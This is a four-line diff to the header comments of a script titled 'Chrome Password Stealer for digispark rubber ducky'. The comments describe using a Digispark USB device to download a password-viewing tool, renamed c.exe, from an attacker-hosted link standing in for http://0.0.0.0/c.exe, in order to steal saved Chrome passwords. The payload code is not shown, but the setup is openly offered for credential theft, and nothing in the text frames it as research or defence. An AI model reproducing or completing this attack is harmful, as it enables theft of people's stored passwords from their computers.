@@ -1,4 +1,4 @@
-//Chrome Password Stealer- coded by SpeedCuber
+//Chrome Password Stealer for digispark rubber ducky - coded by SpeedCuber
 //http://www.nirsoft.net/toolsdownload/chromepass.zip -> extract and rename chromepassviewer to c.exe
 // change http://0.0.0.0/c.exe with chromepassviewer.exe download link
 
